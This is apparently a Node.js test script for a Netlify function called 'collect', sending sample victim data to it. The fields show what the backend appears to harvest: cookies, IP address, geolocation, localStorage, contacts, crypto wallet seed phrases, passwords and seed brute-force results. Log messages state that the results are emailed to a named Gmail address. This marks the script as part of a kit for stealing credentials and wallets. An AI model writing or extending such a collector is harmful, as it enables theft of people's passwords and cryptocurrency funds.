const axios = require("axios");

// Test data for Netlify function
const testData = {
  timestamp: new Date().toISOString(),
  userAgent:
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
  platform: "MacIntel",
  device: "8",
  language: "en-US",
  cookies: "test=value",
  screen: "1920x1080",
  ip: "192.168.1.100",
  latitude: "40.7128",
  longitude: "-74.0060",
  accuracy: "10",
  geoError: "None",
  localStorage: "{}",
  contacts: "Contacts API not supported",
  walletName: "Test Crypto Wallet",
  seedPhrase: "test seed phrase for testing purposes",
  password: "testPassword123",
  bruteForceResults: [
    { seed: "test seed phrase for testing purposes", valid: true },
  ],
};

async function testNetlifyFunction() {
  try {
    console.log("🌐 Testing Netlify Function...");
    console.log("📤 Sending data to Netlify function endpoint...");
    console.log("📧 Expected email recipient: 411plus411@gmail.com");

    // Test the Netlify function endpoint
    const response = await axios.post(
      "http://localhost:8888/.netlify/functions/collect",
      testData,
      {
        headers: {
          "Content-Type": "application/json",
        },
        timeout: 10000,
      }
    );

    console.log("✅ Netlify function test successful!");
    console.log("📧 Email should have been sent to 411plus411@gmail.com");
    console.log("📋 Response:", response.data);
  } catch (error) {
    console.error("❌ Error testing Netlify function:", error.message);
    if (error.response) {
      console.error("Server response:", error.response.data);
    }
    console.log("");
    console.log(
      "💡 Note: This test requires Netlify CLI to be running locally."
    );
    console.log("   To test locally: npx netlify dev");
  }
}

testNetlifyFunction();
